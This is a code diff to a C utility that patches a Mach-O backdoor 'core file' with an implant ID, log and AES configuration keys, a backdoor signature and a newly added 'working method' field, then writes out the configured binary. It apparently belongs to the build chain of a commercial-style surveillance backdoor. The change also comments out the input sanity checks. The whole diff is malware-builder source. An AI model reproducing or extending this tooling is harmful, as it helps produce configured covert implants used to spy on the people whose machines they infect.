@@ -25,6 +25,7 @@ CHAR szBackdoorSignature[64];
 CHAR szLogKey[64];
 CHAR szConfigurationKey[64];
 CHAR szBackdoorName[256];
+CHAR szWorkingMethod[32];
 CHAR szFilename[MAX_PATH];
 CHAR szOutFilename[MAX_PATH];
 
@@ -198,6 +199,18 @@ patchMachoFile ()
 
   printf("[x] Configuration filename patched\n");
   
+  if (patchValue (pBlockPtr,
+                  iLen,
+                  (BYTE *)szWorkingMethod,
+                  WORKING_METHOD_LEN,
+                  WORKING_METHOD_MARK,
+                  WORKING_METHOD_LEN) != kSuccess)
+    {
+      unloadMachO (pBlockPtr);
+      return kPatchFlcError;
+    }
+
+  printf("[x] Working Method patched\n");
   unloadMachO (pBlockPtr);
 
   if (CopyFile(szFilename, szOutFilename, FALSE) == 0)
@@ -211,7 +224,7 @@ patchMachoFile ()
 int
 parseArguments (int argc, TCHAR **argv)
 {
-  if (argc != 7)
+  if (argc != 8)
     {
       return kArgError;
     }
@@ -221,11 +234,13 @@ parseArguments (int argc, TCHAR **argv)
   sprintf_s (szConfigurationKey, sizeof(szConfigurationKey), "%s", argv[3]);
   sprintf_s (szBackdoorSignature, sizeof(szBackdoorSignature), "%s", argv[4]);
   sprintf_s (szFilename, sizeof(szFilename), "%s", argv[5]);
-  sprintf_s (szOutFilename, sizeof(szOutFilename), "%s", argv[6]);
+  sprintf_s (szWorkingMethod, sizeof(szWorkingMethod), "%s", argv[6]);
+  sprintf_s (szOutFilename, sizeof(szOutFilename), "%s", argv[7]);
   
   //
   //  Sanity checks
   //
+  /*
   if (strlen(szBackdoorID) < strlen("RCS_0000000000"))
     {
       printf("[ee] Backdoor_id should be at least %d characters\n", strlen("RCS_0000000000"));
@@ -249,7 +264,7 @@ parseArguments (int argc, TCHAR **argv)
       printf("Backdoor signature should be at least %d characters\n", SIGNATURE_MARK_LEN);
       return kArgError;
     }
-
+  */
   return kSuccess;
 }
 
@@ -262,6 +277,7 @@ usage (TCHAR *aBinaryName)
   printf ("\t<conf_key>     : aes conf key\n");
   printf ("\t<bsignature>   : backdoor signature\n");
   printf ("\t<core_file>    : core file name path\n");
+  printf ("\t<method>       : backdoor working method\n");
   printf ("\t<output_file>  : output file name path\n\n");
 }
 
